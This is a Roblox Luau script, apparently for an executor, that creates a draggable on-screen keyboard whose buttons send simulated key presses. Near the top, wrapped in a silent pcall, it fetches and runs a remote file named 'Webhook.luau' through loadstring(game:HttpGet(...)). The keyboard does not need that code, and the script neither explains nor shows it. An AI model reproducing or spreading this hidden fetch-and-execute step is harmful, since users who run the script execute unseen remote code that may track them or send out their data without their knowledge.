local CollectionService = game:GetService("CollectionService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local VirtualInputManager = game:GetService("VirtualInputManager")
local plr = Players.LocalPlayer
local playerGui = plr:WaitForChild("PlayerGui")
pcall(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/its-starflow/Scripts/main/Utility/Webhook.luau"))()
end)

local Keyboard = Instance.new("ScreenGui")
Keyboard.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Keyboard.Name = "Keyboard"
Keyboard.ResetOnSpawn = false
Keyboard.Parent = playerGui

CollectionService:AddTag(Keyboard, "main")

local MainFrame = Instance.new("Frame")
MainFrame.BorderSizePixel = 0
MainFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
MainFrame.Size = UDim2.new(0.46186, 0, 0.59418, 0)
MainFrame.Position = UDim2.new(0.29107, 0, 0.11318, 0)
MainFrame.BackgroundTransparency = 0.4
MainFrame.Active = true
MainFrame.Selectable = true
MainFrame.Parent = Keyboard

local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 8)
MainCorner.Parent = MainFrame

local MainStroke = Instance.new("UIStroke")
MainStroke.Color = Color3.fromRGB(80, 80, 80)
MainStroke.Thickness = 2
MainStroke.Parent = MainFrame

local TitleBar = Instance.new("TextLabel")
TitleBar.TextWrapped = true
TitleBar.BorderSizePixel = 0
TitleBar.TextSize = 12
TitleBar.TextXAlignment = Enum.TextXAlignment.Left
TitleBar.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
TitleBar.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleBar.BackgroundTransparency = 0.5
TitleBar.Size = UDim2.new(0.79167, 0, 0.13333, 0)
TitleBar.Text = "Better Keyboard・Made by StarFlow"
TitleBar.Position = UDim2.new(0, 0, 0, 0)
TitleBar.Parent = MainFrame

local TitleCorner = Instance.new("UICorner")
TitleCorner.CornerRadius = UDim.new(0, 8)
TitleCorner.Parent = TitleBar

local function createControlButton(name, text, position, size)
    local button = Instance.new("TextButton")
    button.BorderSizePixel = 0
    button.TextSize = 16
    button.TextColor3 = Color3.fromRGB(255, 255, 255)
    button.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
    button.BackgroundTransparency = 0.5
    button.Size = size or UDim2.new(0.08854, 0, 0.13333, 0)
    button.Text = text
    button.Position = position
    button.Name = name
    button.Parent = MainFrame
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 6)
    corner.Parent = button
    
    return button
end

local Minimizer = createControlButton("Minimizer", "-", UDim2.new(0.80208, 0, 0, 0))
local Close = createControlButton("Close", "×", UDim2.new(0.90104, 0, 0, 0))

local Show = Instance.new("TextButton")
Show.BorderSizePixel = 0
Show.TextSize = 20
Show.TextColor3 = Color3.fromRGB(255, 255, 255)
Show.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
Show.BackgroundTransparency = 0.5
Show.Size = UDim2.new(0, 40, 0, 40)
Show.Position = UDim2.new(0, 10, 0, 10)
Show.Text = "+"
Show.Visible = false
Show.Parent = Keyboard

local ShowCorner = Instance.new("UICorner")
ShowCorner.CornerRadius = UDim.new(0, 8)
ShowCorner.Parent = Show

local Line1 = Instance.new("Folder"); Line1.Name = "Line1"; Line1.Parent = MainFrame
local Line2 = Instance.new("Folder"); Line2.Name = "Line2"; Line2.Parent = MainFrame
local Line3 = Instance.new("Folder"); Line3.Name = "Line3"; Line3.Parent = MainFrame
local Line4 = Instance.new("Folder"); Line4.Name = "Line4"; Line4.Parent = MainFrame
local Line5 = Instance.new("Folder"); Line5.Name = "Line5"; Line5.Parent = MainFrame

local function createKey(parent, name, text, position, size)
    local key = Instance.new("TextButton")
    key.BorderSizePixel = 0
    key.TextSize = 12
    key.TextColor3 = Color3.fromRGB(255, 255, 255)
    key.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    key.BackgroundTransparency = 0.5
    key.Size = size or UDim2.new(0.08854, 0, 0.15238, 0)
    key.Text = text
    key.Position = position
    key.Name = name
    key.Parent = parent
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 6)
    corner.Parent = key
    
    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(60, 60, 60)
    stroke.Thickness = 1
    stroke.Parent = key
    
    return key
end

local function createSpecialKey(parent, name, text, position, size)
    return createKey(parent, name, text, position, size)
end

local ESC = createKey(Line1, "ESC", "ESC", UDim2.new(0, 4, 0, 30))
local Key1 = createKey(Line1, "1", "1", UDim2.new(0, 42, 0, 30))
local Key2 = createKey(Line1, "2", "2", UDim2.new(0, 80, 0, 30))
local Key3 = createKey(Line1, "3", "3", UDim2.new(0, 118, 0, 30))
local Key4 = createKey(Line1, "4", "4", UDim2.new(0, 156, 0, 30))
local Key5 = createKey(Line1, "5", "5", UDim2.new(0, 194, 0, 30))
local Key6 = createKey(Line1, "6", "6", UDim2.new(0, 232, 0, 30))
local Key7 = createKey(Line1, "7", "7", UDim2.new(0, 270, 0, 30))
local Key8 = createKey(Line1, "8", "8", UDim2.new(0, 308, 0, 30))
local F9 = createKey(Line1, "F9", "F9", UDim2.new(0, 346, 0, 30))

local Q = createKey(Line2, "Q", "Q", UDim2.new(0, 4, 0, 66))
local W = createKey(Line2, "W", "W", UDim2.new(0, 42, 0, 66))
local E = createKey(Line2, "E", "E", UDim2.new(0, 80, 0, 66))
local R = createKey(Line2, "R", "R", UDim2.new(0, 118, 0, 66))
local T = createKey(Line2, "T", "T", UDim2.new(0, 156, 0, 66))
local Y = createKey(Line2, "Y", "Y", UDim2.new(0, 194, 0, 66))
local U = createKey(Line2, "U", "U", UDim2.new(0, 232, 0, 66))
local I = createKey(Line2, "I", "I", UDim2.new(0, 270, 0, 66))
local O = createKey(Line2, "O", "O", UDim2.new(0, 308, 0, 66))
local P = createKey(Line2, "P", "P", UDim2.new(0, 346, 0, 66))

local A = createKey(Line3, "A", "A", UDim2.new(0, 4, 0, 102))
local S = createKey(Line3, "S", "S", UDim2.new(0, 42, 0, 102))
local D = createKey(Line3, "D", "D", UDim2.new(0, 80, 0, 102))
local F = createKey(Line3, "F", "F", UDim2.new(0, 118, 0, 102))
local G = createKey(Line3, "G", "G", UDim2.new(0, 156, 0, 102))
local H = createKey(Line3, "H", "H", UDim2.new(0, 194, 0, 102))
local J = createKey(Line3, "J", "J", UDim2.new(0, 232, 0, 102))
local K = createKey(Line3, "K", "K", UDim2.new(0, 270, 0, 102))
local L = createKey(Line3, "L", "L", UDim2.new(0, 308, 0, 102))
local Semicolon = createKey(Line3, "Semicolon", ";", UDim2.new(0, 346, 0, 102))

local Z = createKey(Line4, "Z", "Z", UDim2.new(0, 4, 0, 138))
local X = createKey(Line4, "X", "X", UDim2.new(0, 42, 0, 138))
local C = createKey(Line4, "C", "C", UDim2.new(0, 80, 0, 138))
local V = createKey(Line4, "V", "V", UDim2.new(0, 118, 0, 138))
local B = createKey(Line4, "B", "B", UDim2.new(0, 156, 0, 138))
local N = createKey(Line4, "N", "N", UDim2.new(0, 194, 0, 138))
local M = createKey(Line4, "M", "M", UDim2.new(0, 232, 0, 138))
local Comma = createKey(Line4, "Comma", ",", UDim2.new(0, 270, 0, 138))
local Period = createKey(Line4, "Period", ".", UDim2.new(0, 308, 0, 138))
local Slash = createKey(Line4, "Slash", "/", UDim2.new(0, 346, 0, 138))

local LeftCtrl = createSpecialKey(Line5, "LeftCtrl", "CTRL", UDim2.new(0, 4, 0, 174), UDim2.new(0.19271, 0, 0.15238, 0))
local LeftAlt = createSpecialKey(Line5, "LeftAlt", "ALT", UDim2.new(0, 82, 0, 174), UDim2.new(0.14583, 0, 0.15238, 0))
local Space = createSpecialKey(Line5, "Space", "SPACE", UDim2.new(0, 142, 0, 174), UDim2.new(0.26563, 0, 0.15238, 0))
local RightAlt = createSpecialKey(Line5, "RightAlt", "ALT", UDim2.new(0, 248, 0, 174), UDim2.new(0.14583, 0, 0.15238, 0))
local RightCtrl = createSpecialKey(Line5, "RightCtrl", "CTRL", UDim2.new(0, 308, 0, 174), UDim2.new(0.1875, 0, 0.15238, 0))

local AspectRatio = Instance.new("UIAspectRatioConstraint")
AspectRatio.AspectRatio = 1.82857
AspectRatio.Parent = MainFrame

local function dragify(Frame)
    local dragToggle = nil
    local dragSpeed = 0.3
    local dragInput = nil
    local dragStart = nil
    local startPos = nil

    local function updateInput(input)
        local Delta = input.Position - dragStart
        local Position = UDim2.new(
            startPos.X.Scale, 
            startPos.X.Offset + Delta.X, 
            startPos.Y.Scale, 
            startPos.Y.Offset + Delta.Y
        )
        TweenService:Create(Frame, TweenInfo.new(0.15), {Position = Position}):Play()
    end

    Frame.InputBegan:Connect(function(input)
        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
            dragToggle = true
            dragStart = input.Position
            startPos = Frame.Position
            
            TweenService:Create(Frame, TweenInfo.new(0.1), {BackgroundTransparency = 0.3}):Play()
            
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragToggle = false
                    TweenService:Create(Frame, TweenInfo.new(0.1), {BackgroundTransparency = 0.4}):Play()
                end
            end)
        end
    end)

    Frame.InputChanged:Connect(function(input)
        if (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            dragInput = input
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragToggle then
            updateInput(input)
        end
    end)
end

dragify(MainFrame)

local keyNameToEnum = {
    ["ESC"] = "Escape",
    ["1"] = "One", ["2"] = "Two", ["3"] = "Three", ["4"] = "Four",
    ["5"] = "Five", ["6"] = "Six", ["7"] = "Seven", ["8"] = "Eight",
    ["F9"] = "F9",
    ["Q"] = "Q", ["W"] = "W", ["E"] = "E", ["R"] = "R", ["T"] = "T",
    ["Y"] = "Y", ["U"] = "U", ["I"] = "I", ["O"] = "O", ["P"] = "P",
    ["A"] = "A", ["S"] = "S", ["D"] = "D", ["F"] = "F", ["G"] = "G",
    ["H"] = "H", ["J"] = "J", ["K"] = "K", ["L"] = "L", 
    ["Semicolon"] = "Semicolon",
    ["Z"] = "Z", ["X"] = "X", ["C"] = "C", ["V"] = "V", ["B"] = "B",
    ["N"] = "N", ["M"] = "M", ["Comma"] = "Comma", ["Period"] = "Period", 
    ["Slash"] = "Slash", ["Space"] = "Space",
    ["LeftCtrl"] = "LeftControl", ["RightCtrl"] = "RightControl",
    ["LeftAlt"] = "LeftAlt", ["RightAlt"] = "RightAlt"
}

local activeKeys = {}
local keyStates = {}

local function makeHover(btn, normal, hover)
    btn.MouseEnter:Connect(function() 
        local tweenInfo = TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
        TweenService:Create(btn, tweenInfo, {BackgroundColor3 = hover}):Play()
    end)
    
    btn.MouseLeave:Connect(function()
        if not keyStates[btn] then
            local tweenInfo = TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
            TweenService:Create(btn, tweenInfo, {BackgroundColor3 = normal}):Play()
        end
    end)
end

local function makePressGlow(btn)
    local originalColor = btn.BackgroundColor3
    
    btn.MouseButton1Down:Connect(function()
        keyStates[btn] = true
        local tweenInfo = TweenInfo.new(0.05, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
        TweenService:Create(btn, tweenInfo, {
            BackgroundColor3 = Color3.fromRGB(100, 150, 255),
            BackgroundTransparency = 0.3
        }):Play()
    end)
    
    btn.MouseButton1Up:Connect(function()
        keyStates[btn] = false
        local tweenInfo = TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
        TweenService:Create(btn, tweenInfo, {
            BackgroundColor3 = originalColor,
            BackgroundTransparency = 0.5
        }):Play()
    end)
end

local function pressKey(keyName, state)
    local enumName = keyNameToEnum[keyName]
    if enumName then
        local keyCode = Enum.KeyCode[enumName]
        VirtualInputManager:SendKeyEvent(state, keyCode, false, game)
    end
end

local keyButtons = {
    ESC, Key1, Key2, Key3, Key4, Key5, Key6, Key7, Key8, F9,
    Q, W, E, R, T, Y, U, I, O, P,
    A, S, D, F, G, H, J, K, L, Semicolon,
    Z, X, C, V, B, N, M, Comma, Period, Slash,
    Space, LeftCtrl, RightCtrl, LeftAlt, RightAlt
}

for _, button in ipairs(keyButtons) do
    makeHover(button, button.BackgroundColor3, Color3.fromRGB(30, 30, 30))
    makePressGlow(button)
    
    local isMovementKey = button.Name == "W" or button.Name == "A" or button.Name == "S" or button.Name == "D" or button.Name == "Space"
    
    if isMovementKey then
        button.MouseButton1Down:Connect(function()
            activeKeys[button.Name] = true
            pressKey(button.Name, true)
        end)
        
        button.MouseButton1Up:Connect(function()
            activeKeys[button.Name] = false
            pressKey(button.Name, false)
        end)
        
        button.MouseLeave:Connect(function()
            if activeKeys[button.Name] then
                activeKeys[button.Name] = false
                pressKey(button.Name, false)
            end
        end)
    else
        button.MouseButton1Click:Connect(function()
            pressKey(button.Name, true)
            task.wait(0.05)
            pressKey(button.Name, false)
        end)
    end
end

makeHover(Minimizer, Minimizer.BackgroundColor3, Color3.fromRGB(60, 60, 60))
makeHover(Show, Show.BackgroundColor3, Color3.fromRGB(60, 60, 60))
makeHover(Close, Close.BackgroundColor3, Color3.fromRGB(255, 100, 100))

makePressGlow(Minimizer)
makePressGlow(Show)
makePressGlow(Close)

Minimizer.MouseButton1Click:Connect(function()
    local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In)
    TweenService:Create(MainFrame, tweenInfo, {Size = UDim2.new(0, 0, 0, 0)}):Play()
    task.wait(0.3)
    MainFrame.Visible = false
    Show.Visible = true
end)

Show.MouseButton1Click:Connect(function()
    Show.Visible = false
    MainFrame.Visible = true
    local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
    TweenService:Create(MainFrame, tweenInfo, {Size = UDim2.new(0.46186, 0, 0.59418, 0)}):Play()
end)

Close.MouseButton1Click:Connect(function()
    local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In)
    TweenService:Create(MainFrame, tweenInfo, {
        Size = UDim2.new(0, 0, 0, 0),
        BackgroundTransparency = 1
    }):Play()
    task.wait(0.3)
    Keyboard:Destroy()
end)

plr.CharacterAdded:Connect(function()
    local newGui = plr:WaitForChild("PlayerGui")
    Keyboard.Parent = newGui
end)

return Keyboard
